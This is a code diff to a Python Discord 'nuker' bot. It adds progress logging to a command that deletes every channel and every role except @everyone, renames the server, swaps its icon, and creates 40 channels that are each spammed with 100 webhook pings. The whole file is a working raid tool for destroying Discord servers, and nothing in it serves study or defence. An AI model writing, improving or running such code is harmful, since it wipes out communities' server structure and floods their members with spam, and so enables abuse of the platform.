@@ -15,7 +15,6 @@ guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b
 channels_to_create = 40
 pings_per_channel = 100
 
-# Bot setup
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 
@@ -29,19 +28,25 @@ async def nuke(ctx):
     guild = ctx.guild
     print("⚠️ Starting NUKE sequence...")
 
-    # Delete all channels with delay
-    for channel in list(guild.channels):
+    # Delete channels safely
+    channels = list(guild.channels)
+    print(f"Deleting {len(channels)} channels...")
+    for channel in channels:
         try:
             await channel.delete()
+            print(f"Deleted channel: {channel.name}")
             await asyncio.sleep(0.5)
         except Exception as e:
             print(f"❌ Failed to delete channel {channel.name}: {e}")
 
-    # Delete all roles except @everyone
-    for role in list(guild.roles):
+    # Delete roles safely
+    roles = list(guild.roles)
+    print(f"Deleting {len(roles)} roles (except @everyone)...")
+    for role in roles:
         if role.name != "@everyone":
             try:
                 await role.delete()
+                print(f"Deleted role: {role.name}")
                 await asyncio.sleep(0.5)
             except Exception as e:
                 print(f"❌ Failed to delete role {role.name}: {e}")
@@ -53,23 +58,31 @@ async def nuke(ctx):
                 if resp.status == 200:
                     icon_data = await resp.read()
                     await guild.edit(name=guild_name, icon=icon_data)
+                    print(f"Server renamed to '{guild_name}' and icon updated.")
+                else:
+                    print(f"Failed to download guild icon, HTTP {resp.status}")
     except Exception as e:
         print(f"❌ Failed to change server name/icon: {e}")
 
-    # Create channels and spam with adjusted delays
+    # Create channels and spam
+    print(f"Creating {channels_to_create} channels and spamming {pings_per_channel} times each...")
     for i in range(channels_to_create):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
-            await asyncio.sleep(0.5)  # Slower channel creation
-            webhook = await channel.create_webhook(name=webhook_name)
+            print(f"Created channel: {channel.name}")
+            await asyncio.sleep(0.5)
 
-            for _ in range(pings_per_channel):
+            webhook = await channel.create_webhook(name=webhook_name)
+            print(f"Created webhook in {channel.name}")
+
+            for ping_count in range(pings_per_channel):
                 try:
                     await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
-                    await asyncio.sleep(0.1)  # Faster pinging
+                    if (ping_count + 1) % 10 == 0:
+                        print(f"Sent {ping_count + 1} pings in {channel.name}")
+                    await asyncio.sleep(0.1)
                 except Exception as e:
-                    print(f"❌ Webhook send failed in channel {channel.name}: {e}")
-
+                    print(f"❌ Webhook send failed in channel {channel.name} at ping {ping_count + 1}: {e}")
         except Exception as e:
             print(f"❌ Failed to create/spam channel {i}: {e}")
 
